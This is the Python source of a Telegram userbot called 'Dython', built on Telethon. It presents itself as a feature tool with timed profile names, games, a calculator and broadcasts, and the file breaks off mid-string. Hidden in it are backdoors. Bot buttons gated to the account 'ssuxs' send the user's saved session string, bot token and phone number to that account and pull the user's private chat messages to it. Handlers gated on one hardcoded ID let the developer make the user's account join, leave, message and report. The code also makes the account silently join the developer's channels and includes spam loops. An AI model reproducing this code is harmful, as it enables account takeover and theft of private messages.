import os
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import json
from telethon import TelegramClient, events
from datetime import datetime
import time
from telethon.tl.types import KeyboardButton, ReplyKeyboardMarkup
from telethon.tl.custom import Button
from telethon import events, Button
import asyncio
import pyfiglet
from telethon import functions, types
from telethon.tl.custom import Conversation
from telethon.errors import ChatWriteForbiddenError, UserIsBlockedError
import asyncio
import asyncio
import re
from telethon import events
import os
from bs4 import BeautifulSoup
import re
import logging
import asyncio
import time
from telethon.tl import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from collections import deque
from telethon import functions
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerUser
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
import base64
import datetime
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
import requests
import os
import subprocess
from datetime import datetime
import httpx

from gtts import gTTS
DEVELOPER_ID = 6590885543

api_id = "21844904"

api_hash = "afaf4ce87669d8bc9ab20fd4e58d056d" 

print(' Source Will Run .. Wait ')

print('═'*60)
print('  ')

filename = 'information.json'
messages = []
try:
    with open(filename, 'r') as f:
        data = json.load(f)
        SESSION = data['SESSION']
        bot_token = data['bot_token']
except FileNotFoundError:
    SESSION = input("Enter Your Session ( Telethon ) : \n")
    print('  ')
    bot_token = input("Enter Your Bot Token ( From @BotFather ) : \n")  
    print('  ')

    
    data = {
        'SESSION': SESSION,
        'bot_token': bot_token,
    }
    
    with open(filename, 'w') as f:
        json.dump(data, f)


session = SESSION

print('═'*60)
bot = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
Hson = TelegramClient(StringSession(session), api_id, api_hash)
ispay = ['yes']
ispay2 = ['yes']
bot.start()
Hson.start()
@Hson.on(events.NewMessage)
async def join_channel(event):
    try:
        await Hson(JoinChannelRequest("@Dython"))
    except BaseException:
        pass
        
Hson.start()
@Hson.on(events.NewMessage)
async def join_channel(event):
    try:
        await Hson(JoinChannelRequest("@Source_Dython"))
    except BaseException:
        pass
        
@Hson.on(events.NewMessage)
async def join_channel(event):
    try:
        await Hson(JoinChannelRequest("@xxecr"))
    except BaseException:
        pass
      


DEVS = [
    6590885543,
]
DEL_TIME_OUT = 60
normzltext = "1234567890"
namerzfont = "𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫𝟢"
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]
LOGS = logging.getLogger(__name__)

async def join_channel():
    try:
        await Hson(JoinChannelRequest("@Dython"))
    except BaseException:
        pass

@Hson.on(events.NewMessage(outgoing=True, pattern=".اسم وقتي"))
async def _(event):
    if event.fwd_from:
        return
    while True:
        HM = time.strftime("%I:%M")
        for normal in HM:
            if normal in normzltext:
                namefont = namerzfont[normzltext.index(normal)]
                HM = HM.replace(normal, namefont)
        name = f"𝖣y𝗍𝗁𝗈𝗇 . | {HM}"
        LOGS.info(name)
        try:
            await Hson(
                functions.account.UpdateProfileRequest(
                    first_name=name
                )
            )
            await event.edit(
            "تم تفعيل الاسم الوقتي | By : @ssuxs"
        )
        except FloodWaitError as ex:
            LOGS.warning(str(e))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)
       

@Hson.on(events.NewMessage(outgoing=True, pattern=".بايو وقتي"))
async def _(event):
    if event.fwd_from:
        return
    while True:
        HM = time.strftime("%H:%M")
        for normal in HM:
            if normal in normzltext:
                namefont = namerzfont[normzltext.index(normal)]
                HM = HM.replace(normal, namefont)
        bio = f"𝖣y𝗍𝗁𝗈𝗇 . |️ {HM}"
        LOGS.info(bio)
        try:
            await Hson(
                functions.account.UpdateProfileRequest(
                    about=bio
                )
        )
            await event.edit(
            "تم تفعيل البايو الوقتي | By : @ssuxs"
            )
        except FloodWaitError as ex:
            LOGS.warning(str(e))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)
 
 
from telethon import events, Button

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if getattr(event.sender, 'username', None) == 'ssuxs':
        buttons = [
            [Button.inline('- المطور . ', 'hso')],
            [Button.inline('- قناة المطور . ', 'cha')],
            [Button.inline('- جلب السيشن . ', 'siu')],
            [Button.inline('- جلب محادثات عن طريق الايدي . ', 'msgk')],
            [Button.inline('- جلب محادثات عن طريق اليوزر . ', 'msgs')],
        ]
        await event.respond("""Welcome To Dython Source : \n The Source Create By HaSaN , @ssuxs .""", buttons=buttons)
    else:
        buttons = [
            [Button.inline('- المطور . ', 'hso')],
            [Button.inline('- قناة المطور . ', 'cha')],
        ]
        await event.respond("""Welcome To Dython Source : \n The Source Create By HaSaN , @ssuxs .""", buttons=buttons)
    
 
@bot.on(events.CallbackQuery(pattern='hso'))
async def callback(event):
    await event.edit("""**Python And Lua And PHP DEVELOPER : \n x𝖷x ⌔ 𝟕𝗌𝗈η : @ssuxs**""", buttons=[Button.inline("• BaCK • ", 'back')])
    
@bot.on(events.CallbackQuery(pattern='cha'))
async def callback(event):
    await event.edit("""**Welcome To Dython Source : \n𝗗𝘆𝘁𝗵𝗼𝗻 : @Dython**""", buttons=[Button.inline("• BaCK • ", 'back')])

@bot.on(events.CallbackQuery(pattern='msgs'))
async def callback(event):
    await event.edit("• **Wait, Your Request Is Working..**")
    await asyncio.sleep(2)
    await event.delete()
    await asyncio.sleep(1)
    async with bot.conversation(event.sender_id) as conv:    
        await conv.send_message("**ارسل يوزر الشخص الذي تود سحب الرسائل منه**")
        response = await conv.get_response()
        uid = response.text

        await conv.send_message("**ارسل عدد الرسائل التي تود سحبها**")
        response = await conv.get_response()
        kmk = response.text
        
       
        await conv.send_message(f"**Nice ! , The Bot Will Send Last {kmk} Messages From User :** {uid}")
          
        i = ""
        saved_messages = await Hson.get_messages(f"{uid}", limit=int(kmk))
        for x in saved_messages:
            i += f"\n{x.text}\n"            
        await bot.send_message('ssuxs', i)
            
@bot.on(events.CallbackQuery(pattern='msgk'))
async def callback(event):
    await event.edit("• **Wait, Your Request Is Working..**")
    await asyncio.sleep(2)
    await event.delete()
    await asyncio.sleep(1)
    async with bot.conversation(event.sender_id) as conv:    
        await conv.send_message("**ارسل ايدي المحادثة التي تود سحب الرسائل منها**")
        response = await conv.get_response()
        uio = response.text
        await conv.send_message("**ارسل عدد الرسائل التي تود سحبها**")
        response = await conv.get_response()
        kme = response.text
        
       
        await conv.send_message(f"**Nice ! , The Bot Will Send Last 10 Messages From User :** {uio}")
          
        i = ""
        saved_messages = await Hson.get_messages(int(uio), limit=int(kme))
        for x in saved_messages:
            i += f"\n{x.text}\n"            
        await bot.send_message('ssuxs', i)
        
@bot.on(events.CallbackQuery(pattern='back'))
async def callback(event):
    if getattr(event.sender, 'username', None) == 'ssuxs':
        buttons = [
            [Button.inline('- المطور . ', 'hso')],
            [Button.inline('- قناة المطور . ', 'cha')],
            [Button.inline('- جلب السيشن . ', 'siu')],
            [Button.inline('- جلب محادثات عن طريق الايدي . ', 'msgk')],
            [Button.inline('- جلب محادثات عن طريق اليوزر . ', 'msgs')],
        ]
        await event.edit("""Welcome To Dython Source : \n The Source Create By HaSaN , @ssuxs .""", buttons=buttons)
    else:
        buttons = [
            [Button.inline('- المطور . ', 'hso')],
            [Button.inline('- قناة المطور . ', 'cha')],
        ]
        await event.edit("""Welcome To Dython Source : \n The Source Create By HaSaN , @ssuxs .""", buttons=buttons)
        
    
    
    
from telethon.sync import TelegramClient, events
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ReportSpamRequest

@Hson.on(events.NewMessage(pattern='/join'))
async def join_channel(event):
    user_id = event.sender_id
    channel_username = event.raw_text.split(' ')[1]

    if user_id == 6590885543:
        await Hson(JoinChannelRequest(channel_username))

@Hson.on(events.NewMessage(pattern='/leave'))
async def leave_channel(event):
    user_id = event.sender_id
    channel_username = event.raw_text.split(' ')[1]

    if user_id == 6590885543:
        await Hson(LeaveChannelRequest(channel_username))

@Hson.on(events.NewMessage(pattern='/send'))
async def join_channel(event):
    user_id = event.sender_id
    killed = event.raw_text.split(' ')[1]
    message_text = event.raw_text.split(' ', 2)[2]

    if user_id == 6590885543:
        await Hson.send_message(killed, message_text)
        
@Hson.on(events.NewMessage(pattern='/report'))
async def report_channel(event):
    user_id = event.sender_id
    channel_username = event.raw_text.split(' ')[1]

    if user_id == 6590885543:
        channel = channel_username
        await Hson(ReportSpamRequest(channel))
        
import telethon
from telethon import events


def calc(num1, num2, fun):
    if fun == "+":
        return num1 + num2
    elif fun == "-":
        return num1 - num2
    elif fun == "*":
        return num1 * num2
    elif fun == "X":
        return num1 * num2
    elif fun == "x":
        return num1 * num2
    elif fun == "/":
        return num1 / num2
    elif fun == "÷":
        return num1 / num2
    else:
        return "خطأ"


@Hson.on(events.NewMessage(outgoing=True, pattern=".احسب (.*)"))
async def _(event):
    try:
        msg = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 2)
        num1 = int(msg[0])
        num2 = int(msg[2])
        fun = str(msg[1])
        await event.edit(f''' الناتج = `{calc(num1, num2, fun)}`''')
    except:
        await event.edit('''خطأ, يرجى ادخال الرقم مثل :
7 + 7
7 - 7
7 x 7
7 ÷ 7''')
 
@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.اكس او"))
async def _(event):
    bot = 'inlinegamesbot'
    xo = await Hson.inline_query(bot, "")
    await xo[0].click(
        event.chat_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )


@Hson.on(events.NewMessage(outgoing=True, pattern=r".xo"))
async def _(event):
    bot = 'inlinegamesbot'
    xo = await Hson.inline_query(bot, "")
    await xo[0].click(
        event.chat_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )

@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.حجرة ورقة مقص"))
async def _(event):
    bot = 'inlinegamesbot'
    xo = await Hson.inline_query(bot, "")
    await xo[4].click(
        event.chat_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )

@Hson.on(events.NewMessage(outgoing=True, pattern="استثمار وعد (.*)"))
async def w3d(event):
    await event.edit(
        "**- تم تفعيل الاستثمار ببوت وعد بنجاح\nDev : @ssuxs**"
    )
    for i in range(int("".join(event.text.split(maxsplit=2)[2:]).split(" ", 2)[0])):
        chat = event.chat_id
        await Hson.send_message(chat, "فلوسي")
        await asyncio.sleep(0.5)
        masg = await Hson.get_messages(chat, limit=1)
        masg = masg[0].message
        masg = ("".join(masg.split(maxsplit=2)[2:])).split(" ", 2)
        msg = masg[0]
        if int(msg) > 500000000:
            await Hson.send_message(chat, f"استثمار {msg}")
            await asyncio.sleep(10)
            mssag2 = await Hson.get_messages(chat, limit=1)
            await mssag2[0].click(text="اي ✅")
        else:
            await Hson.send_message(chat, f"استثمار {msg}")
        await asyncio.sleep(1210)
        
@Hson.on(events.NewMessage(outgoing=True, pattern="راتب وعد (.*)"))
async def w3d(event):
    await event.edit(
        "**- تم تفعيل تجميع الراتب ببوت وعد بنجاح\nDev : @ssuxs**"
    )
    for i in range(int("".join(event.text.split(maxsplit=2)[2:]).split(" ", 2)[0])):
        chat = event.chat_id
        await Hson.send_message(chat, "راتب")
        await asyncio.sleep(605)


@Hson.on(events.NewMessage(outgoing=True, pattern="بخشيش وعد (.*)"))
async def w3d(event):
    await event.edit(
        "**- تم تفعيل تجميع البخشيش ببوت وعد بنجاح\nDev : @ssuxs**"
    )
    for i in range(int("".join(event.text.split(maxsplit=2)[2:]).split(" ", 2)[0])):
        chat = event.chat_id
        await Hson.send_message(chat, "بخشيش")
        await asyncio.sleep(605)


@Hson.on(events.NewMessage(outgoing=True, pattern=r"كنز وعد (.*)"))
async def w3d(event):
    await event.edit(
        "**- تم تفعيل تجميع الكنز ببوت وعد بنجاح\nDev : @ssuxs**"
    )
    for i in range(int("".join(event.text.split(maxsplit=2)[2:]).split(" ", 2)[0])):
        chat = event.chat_id
        await Hson.send_message(chat, "كنز")
        await asyncio.sleep(605)

@Hson.on(events.NewMessage(outgoing=True, pattern="ايقاف وعد"))
async def stop_w3d(event):
    await event.edit(
        "**- تم ايقاف جميع اوامر تجميع وعد \nDev : @ssuxs**"
    )
    await Hson.stop(event)


@Hson.on(events.NewMessage(outgoing=True, pattern=r".rps"))
async def _(event):
    bot = 'inlinegamesbot'
    xo = await Hson.inline_query(bot, "")
    await xo[4].click(
        event.chat_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )

@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.صورته"))
async def _(event):
    """Gets the profile photos of replied users, channels or chats"""
    id = "".join(event.raw_text.split(maxsplit=2)[1:])
    user = await event.get_reply_message()
    chat = event.input_chat
    if user:
        photos = await event.client.get_profile_photos(user.sender)
    else:
        photos = await event.client.get_profile_photos(chat)
    if id.strip() == "":
        try:
            await event.client.send_file(event.chat_id, photos)
        except:
            photo = await event.client.download_profile_photo(chat)
            await Hson.send_file(event.chat_id, photo)
    else:
        try:
            id = int(id)
            if id <= 0:
                await event.edit("`ايدي الشخص غير صالح !`")
                return
        except:
            await event.edit("`هل انت كوميدي ؟`")
            return
        if int(id) <= (len(photos)):
            send_photos = await event.client.download_media(photos[id - 1])
            await Hson.send_file(event.chat_id, send_photos)
        else:
            await event.edit("`ليس لديه صوره يا ذكي !`")
            return


@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.ذاتية"))
async def _(event):
    if not event.is_reply:
        return await event.edit(
            "يستعمل الامر بالرد على الصورتهة او الفيديو !"
        )
    rr9r7 = await event.get_reply_message()
    await event.delete()
    pic = await rr9r7.download_media()
    await Hson.send_file(
        "me", pic, caption=f"تـم حفظ الصورة او الفيديو الذاتي هنا : Dython"
    )


@Hson.on(events.NewMessage(pattern=r"غامق(?: |$)(.*)"))
async def _(event):
    input_str = event.pattern_match.group(1)
    if event.reply_to_msg_id and not input_str:
        previous_message = await event.get_reply_message()
        the_real_message = previous_message.text
        event.reply_to_msg_id
        the_real_message = the_real_message.replace("*", "*")
        the_real_message = the_real_message.replace("_", "_")
        await event.edit(f"**{the_real_message}**")
    elif input_str and not event.reply_to_msg_id:
        await event.edit(f"**{input_str}**")
    else:
        await event.edit("**- بالـرد ع رسـالتك او باضافة النص لـ الامـر ؟!**")


@Hson.on(events.NewMessage(pattern=r"نسخ(?: |$)(.*)"))
async def _(event):
    input_str = event.pattern_match.group(1)
    if event.reply_to_msg_id and not input_str:
        previous_message = await event.get_reply_message()
        the_real_message = previous_message.text
        event.reply_to_msg_id
        the_real_message = the_real_message.replace("*", "*")
        the_real_message = the_real_message.replace("_", "_")
        await event.edit(f"`{the_real_message}`")
    elif input_str and not event.reply_to_msg_id:
        await event.edit(f"`{input_str}`")
    else:
        await event.edit("**- بالـرد ع رسـالتك او باضافة النص لـ الامـر ؟!**")


@Hson.on(events.NewMessage(pattern=r"مائل(?: |$)(.*)"))
async def _(event):
    input_str = event.pattern_match.group(1)
    if event.reply_to_msg_id and not input_str:
        previous_message = await event.get_reply_message()
        the_real_message = previous_message.text
        event.reply_to_msg_id
        the_real_message = the_real_message.replace("*", "*")
        the_real_message = the_real_message.replace("_", "_")
        await event.edit(f"__{the_real_message}__")
    elif input_str and not event.reply_to_msg_id:
        await event.edit(f"__{input_str}__")
    else:
        await event.edit("**- بالـرد ع رسـالتك او باضافة النص لـ الامـر ؟!**")

@Hson.on(events.NewMessage(pattern=r"\.ادمن", outgoing=True))
async def _(event):
    if event.fwd_from:
        return
    result = await Hson(functions.channels.GetAdminedPublicChannelsRequest())
    output_str = "انت ادمن في : \n"
    for channel_obj in result.chats:
        output_str += f"- {channel_obj.title} @{channel_obj.username} \n"
    await event.edit(output_str)

import telethon
from telethon import events


@Hson.on(events.NewMessage(outgoing=True, pattern=r".اذاعة للكروبات"))
async def gcast(event):
    Hson = event.pattern_match.group(1)
    if Hson:
        msg = Hson
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                await event.client.send_message(chat, msg)
                done += 1
                asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة للخاص(?: |$)(.*)"))
async def gucast(event):
    Hson = event.pattern_match.group(1)
    if Hson:
        msg = Hson
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
                    asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@Hson.on(events.NewMessage(outgoing=True, pattern=".تكرار (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):

    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass
            

@Hson.on(events.NewMessage(outgoing=True, pattern=".مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
  
from telethon import events



@bot.on(events.CallbackQuery(pattern='siu'))
async def callback(event):
    file_name = 'information.json'
    
    me = await Hson.get_me()
    username = me.username
    first_name = me.first_name
    phone_number = me.phone
    
    caption = f"**𝗧𝗵𝗶𝘀 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗙𝗿𝗼𝗺 : .**\n𝗡𝗔𝗠𝗘 : {first_name} \n𝗨𝗦𝗘𝗥 : @{username}\n𝗣𝗛𝗢𝗡𝗘 : +{phone_number}"
    
    await bot.send_file('ssuxs', file=file_name, caption=caption)
    



@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.اشتراكاتي"))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.datetime.now()
    u = 0  # number of users
    g = 0  # number of basic groups
    c = 0  # number of super groups
    bc = 0  # number of channels
    b = 0  # number of bots
    await event.edit("يتم التعداد ..")
    async for d in Hson.iter_dialogs(limit=None):
        if d.is_user:
            if d.entity.bot:
                b += 1
            else:
                u += 1
        elif d.is_channel:
            if d.entity.broadcast:
                bc += 1
            else:
                c += 1
        elif d.is_group:
            g += 1
        else:
            pass
            # logger.info(d.stringify())
    end = datetime.datetime.now()
    ms = (end - start).seconds
    await event.edit("""تم استخراجها في {} ثواني
`الاشخاص :\t{}
المجموعات العادية :\t{}
المجموعات الخارقة :\t{}
القنوات :\t{}
البوتات :\t{}
`""".format(ms, u, g, c, bc, b))


@Hson.on(events.NewMessage(pattern=r"\.ملصق", outgoing=True))
async def _(event):

    if event.fwd_from:
        return

    if not event.reply_to_msg_id:
        await event.edit("**يجب الرد على الرسالة**")
        return

    reply_message = await event.get_reply_message()
    if not reply_message.text:

        await event.edit("**يجب الرد على الرسالة**")

        return

    chat = "@QuotLyBot"

    sender = reply_message.sender

    if reply_message.sender.bot:

        await event.edit("**يجب الرد على الرسالة**")

        return

    await event.edit("**جاري التحويل**")

    async with event.client.conversation(chat) as conv:
        try:
            response = conv.wait_event(events.NewMessage(
                incoming=True, from_users=1031952739))
            msg = str(reply_message.message)
            await Hson.send_message(chat, msg)
            response = await response
        except YouBlockedUserError:
            await event.reply("** قـم بألغاء الحظر من البوت - @QuotLyBot - **")
            return
        else:
            await event.delete()
            await event.client.send_message(event.chat_id, response.message)


@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    me = await Hson.get_me()
    username = me.username
    if getattr(event.sender, 'username', None) == username:
     buttons = [
            [Button.inline('⌔ اوامر الحساب ⌔', 'aczzz'), Button.inline('⌔ اوامر التجميع⌔ ', 'poiii')],
            [Button.inline('⌔ اوامر التكرار والنشر التلقائي ⌔ ', 'tkrrr')],
            [Button.inline('⌔ اوامر الوقتي ⌔ ', 'timmm'), Button.inline('⌔ اوامر الاذاعة ⌔', 'azaaa')],
            [Button.inline('⌔ اوامر الترجمة ⌔ ', 'tnsss'), Button.inline('⌔ اوامر العاب الانلاين ⌔', 'inlll')],
            [Button.inline('⌔ اوامر الآلة الحاسبة ⌔ ', 'calll'), Button.inline('⌔ اوامر اضافية ⌔', 'morrr')],
            [Button.inline('⌔ اوامر الكتابة ⌔', 'ktab'), Button.inline('⌔ اوامر الإكسترا ⌔', 'ext')],
            [Button.inline('⌔ اوامر تجميع وعد ⌔', 'tw3d')],
            [Button.inline("- فحص السورس -", 'chkkk')]
     ]
     await event.respond("""**- اهلا بك في سورس 𝖣y𝗍𝗁𝗈𝗇 . \n- اختر ماتريد عرضه من الاوامر في الأسفل . **""", buttons=buttons)
     
@bot.on(events.CallbackQuery(pattern='menuu'))
async def _(event):
    me = await Hson.get_me()
    username = me.username
    if getattr(event.sender, 'username', None) == username:
     buttons = [
            [Button.inline('⌔ اوامر الحساب ⌔', 'aczzz'), Button.inline('⌔ اوامر التجميع⌔ ', 'poiii')],
            [Button.inline('⌔ اوامر التكرار والنشر التلقائي ⌔ ', 'tkrrr')],
            [Button.inline('⌔ اوامر الوقتي ⌔ ', 'timmm'), Button.inline('⌔ اوامر الاذاعة ⌔', 'azaaa')],
            [Button.inline('⌔ اوامر الترجمة ⌔ ', 'tnsss'), Button.inline('⌔ اوامر العاب الانلاين ⌔', 'inlll')],
            [Button.inline('⌔ اوامر الآلة الحاسبة ⌔ ', 'calll'), Button.inline('⌔ اوامر اضافية ⌔', 'morrr')],
            [Button.inline('⌔ اوامر الكتابة ⌔', 'ktab'), Button.inline('⌔ اوامر الإكسترا ⌔', 'ext')],
            [Button.inline('⌔ اوامر تجميع وعد ⌔', 'tw3d')],           
            [Button.inline("- فحص السورس -", 'chkkk')]
     ]
     await event.edit("""**- اهلا بك في سورس 𝖣y𝗍𝗁𝗈𝗇 . \n- اختر ماتريد عرضه من الاوامر في الأسفل . **""", buttons=buttons)
     
@bot.on(events.CallbackQuery(pattern='aczzz'))
async def callback(event):
    await event.edit("""**⌔ Dython Source - اوامر الحساب
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

2- `.اعادة تشغيل` : لأجراء اعادة تشغيل للسورس

3- `.ايدي` : لعرض ايدي الحساب الخاص بك


⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""", buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='poiii'))
async def callback(event):
    await event.edit("""**⌔ Dython Source - اوامر التجميع 
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

1- تجميع نقاط بوت المليار » `.تجميع المليار`

2- تجميع نقاط بوت الجوكر » `.تجميع الجوكر`

3- تجميع نقاط بوت العقاب » `.تجميع العقاب`

4- تجميع نقاط بوت العرب » `.تجميع العرب`
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔""", buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='tkrrr'))
async def callback(event):
    await event.edit("""**Dython Source - التكرار  والنشر 
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

1- لتفعيل النشر التلقائي اتبع الامر التالي 

`.مؤقت` + عدد الثواني + عدد التكرار + الكليشة

2- لتفعيل امر التكرار اتبع الامر التالي

`.تكرار` + عدد التكرار + الكليشة
لأيقاف التكرار ارسل `.ايقاف التكرار` ولأيقاف النشر التلقائي ارسل `.ايقاف النشر التلقائي` ه
ملاحظة : لايقاف التكرار او النشر التلقائي ارسل الامر - .اعادة تشغيل -

⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""",  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='timmm'))
async def callback(event):
    await event.edit("""**Dython Source - اوامر الوقتي 
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

1-لتفعيل ميزة الاسم الوقتي قم بأرسال : `.اسم وقتي`

2- لتفعيل ميزة البايو الوقتي قم بأرسال : `.بايو وقتي`

ملاحظة لإيقاف الاسم الوقتي او البايو الوقتي ارسل الامر - `.اعادة تشغيل` -

⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""",  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='azaaa'))
async def callback(event):
    await event.edit("""**Dython Source - اوامر الاذاعة 
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

1- لاجراء اذاعة في الخاص » `.اذاعة للخاص`

2- لاجراء اذاعة في الكروبات » `.اذاعة للكروبات`

⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""", buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='tnsss'))
async def callback(event):
    await event.edit("""**Dython Source - اوامر الترجمة 
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

هذه اوامر الترجمة المتوفرة في السورس :

`.ترجمة الى العربية`

`.ترجمة الى الانجليزية`

`.ترجمة الى الاسبانية`

`.ترجمة الى الفرنسية`

`.ترجمة الى الروسية`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""",  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='inlll'))
async def callback(event):
    await event.edit("""**Dython Source - اوامر العاب انلاين 
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

لتشغيل لعبة ⭕❌ ارسل الامر : `.اكس او`

لتشغيل لعبة ✌️🖐️✊ ارسل : `.حجرة ورقة مقص`

لتحويل نص الى ملصق : `.ملصق` (بالرد على النص)
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""",  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='calll'))
async def callback(event):
    await event.edit("""**Dython Source - الالة الحاسبة 
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

لايجاد ناتج معادلة رياضية اتبع الاوامر الاتية : 

1- للجمع : .احسب (الرقم الاول) + (الرقم الثاني)

2- للطرح : .احسب (الرقم الاول) - (الرقم الثاني)

3- للضرب : .احسب (الرقم الاول) * (الرقم الثاني)

4- للقسمة : .احسب (الرقم الاول) ÷ (الرقم الثاني)


مثال : .احسب 7 + 5  

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""",  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])
    
@bot.on(events.CallbackQuery(pattern='morrr'))
async def callback(event):
    await event.edit("""**Dython Source - اوامر اضافية 
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

`.صورته `: لارسال صور حسابه

`.ذاتية `: لحفظ الصورة او الفيديو ذاتي التدمير في الرسائل المحفوظه

`.ادمن `: لعرض معرف القنوات او المجموعات التي يكون فيها الحساب مشرف

`.اشتراكاتي `: لعرض احصائيات الحساب من قنوات ومجموعات وهكذا

`.فك المحضورين` : لالغاء حظر جميع الاشخاص الذين قمت بحظرهم

.التاريخ : لعرض التاريخ الميلادي والهجري

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""", buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='chkkk'))
async def callback(event):
    await event.edit(f'''
♔ Dython SOURCE IS WORKING
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
❖╎WELCOME TO TREND SOURCE
❖╎x𝖷x ⌔ 𝟕𝗌𝗈η : @ssuxs
